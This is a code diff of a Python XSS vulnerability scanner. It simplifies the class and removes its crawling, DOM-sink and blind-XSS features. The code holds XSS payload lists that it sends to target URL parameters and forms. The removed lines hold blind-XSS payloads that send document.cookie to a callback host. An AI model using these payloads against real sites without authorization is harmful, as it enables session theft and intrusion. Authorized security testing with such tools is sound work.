@@ -1,87 +1,54 @@
-from scanner import Scanner
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, parse_qs, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 from colorama import Fore, Style
 import random
 
-class XSSScanner(Scanner):
+class XSSScanner:
     def __init__(self):
-        super().__init__()
+        self.session = requests.Session()
+        self.session.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Zeroscope/1.0'
+        }
         self.context_payloads = {
             'html': ['"><svg/onload=alert(1)>', '" autofocus onfocus=alert(1)'],
             'js': ['\';alert(1)//', '{{constructor.constructor(\'alert(1)\')()}}'],
             'attribute': [' onmouseover=alert(1)', ' style=animation-name:alert(1)']
         }
 
-    def scan(self, url, crawl=False, check_dom=False, blind_callback=None, verbose=False, output_file=None):
-        if crawl:
-            for found_url in self.crawl(url):
-                self._scan_single(found_url, check_dom, blind_callback, verbose, output_file)
-        else:
-            self._scan_single(url, check_dom, blind_callback, verbose, output_file)
-
-    def _scan_single(self, url, check_dom, blind_callback, verbose, output_file):
-        if check_dom:
-            self._check_dom_xss(url)
-            
-        if blind_callback:
-            self._test_blind_xss(url, blind_callback)
-            
-        self._test_reflected_xss(url, verbose, output_file)
-        self._test_form_xss(url, verbose, output_file)
-
-    def _check_dom_xss(self, url):
+    def scan(self, url, verbose=False, output_file=None):
         try:
-            res = self.session.get(url)
-            dom_sinks = [
-                ('document.write', 'Direct HTML Injection'),
-                ('innerHTML', 'HTML Sink'),
-                ('eval(', 'JS Execution'),
-                ('location.hash', 'Hash Injection')
-            ]
-            
-            for pattern, desc in dom_sinks:
-                if pattern in res.text:
-                    print(f"{Fore.MAGENTA}[!] DOM XSS ({desc}) detected at {url}{Style.RESET_ALL}")
-                    
+            self._test_reflected_xss(url, verbose, output_file)
+            self._test_form_xss(url, verbose, output_file)
         except Exception as e:
             if verbose:
-                print(f"{Fore.RED}[!] DOM check error: {e}{Style.RESET_ALL}")
-
-    def _test_blind_xss(self, url, callback):
-        payloads = [
-            f'<script src="http://{callback}/c={escape(document.cookie)}"></script>',
-            f'<img src=x onerror="fetch(\'http://{callback}/?data=\'+btoa(document.cookie))">'
-        ]
-        
-        for payload in payloads:
-            try:
-                self.session.post(url, data={'input': payload}, timeout=3)
-            except:
-                pass
+                print(f"{Fore.RED}[!] Scan error: {e}{Style.RESET_ALL}")
 
     def _test_reflected_xss(self, url, verbose, output_file):
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-        
-        for param, values in params.items():
-            for ctx, payloads in self.context_payloads.items():
-                for payload in payloads:
-                    test_url = self._build_test_url(parsed, param, payload)
-                    
-                    try:
-                        res = self.session.get(test_url)
-                        if self._is_payload_reflected(res.text, payload):
-                            self._log_vulnerability(
-                                f"Reflected XSS ({ctx}) in {param}",
-                                test_url,
-                                payload,
-                                output_file
-                            )
-                    except Exception as e:
-                        if verbose:
-                            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+        try:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            
+            for param, values in params.items():
+                for ctx, payloads in self.context_payloads.items():
+                    for payload in payloads:
+                        test_url = self._build_test_url(parsed, param, payload)
+                        
+                        try:
+                            res = self.session.get(test_url)
+                            if payload in res.text:
+                                self._log_vulnerability(
+                                    f"Reflected XSS ({ctx}) in {param}",
+                                    test_url,
+                                    payload,
+                                    output_file
+                                )
+                        except Exception as e:
+                            if verbose:
+                                print(f"{Fore.RED}[!] Request failed: {e}{Style.RESET_ALL}")
+        except Exception as e:
+            if verbose:
+                print(f"{Fore.RED}[!] URL parsing error: {e}{Style.RESET_ALL}")
 
     def _test_form_xss(self, url, verbose, output_file):
         try:
@@ -103,7 +70,7 @@ class XSSScanner(Scanner):
                             else:
                                 res = self.session.get(urljoin(url, action), params=data)
                                 
-                            if self._is_payload_reflected(res.text, payload):
+                            if payload in res.text:
                                 self._log_vulnerability(
                                     f"Form XSS ({ctx}) in {action}",
                                     url,
@@ -112,7 +79,10 @@ class XSSScanner(Scanner):
                                 )
                         except Exception as e:
                             if verbose:
-                                print(f"{Fore.RED}[!] Form error: {e}{Style.RESET_ALL}")
+                                print(f"{Fore.RED}[!] Form submit failed: {e}{Style.RESET_ALL}")
+        except Exception as e:
+            if verbose:
+                print(f"{Fore.RED}[!] Form parsing error: {e}{Style.RESET_ALL}")
 
     def _build_test_url(self, parsed, param, payload):
         params = parse_qs(parsed.query)
@@ -126,9 +96,6 @@ class XSSScanner(Scanner):
             if name:
                 data[name] = payload if input_tag.get('type') in ('text', 'search') else input_tag.get('value', '')
         return data
-
-    def _is_payload_reflected(self, response_text, payload):
-        return payload in response_text
 
     def _log_vulnerability(self, title, url, payload, output_file):
         msg = f"{Fore.GREEN}[+] {title}{Style.RESET_ALL}\nURL: {url}\nPayload: {payload}\n"
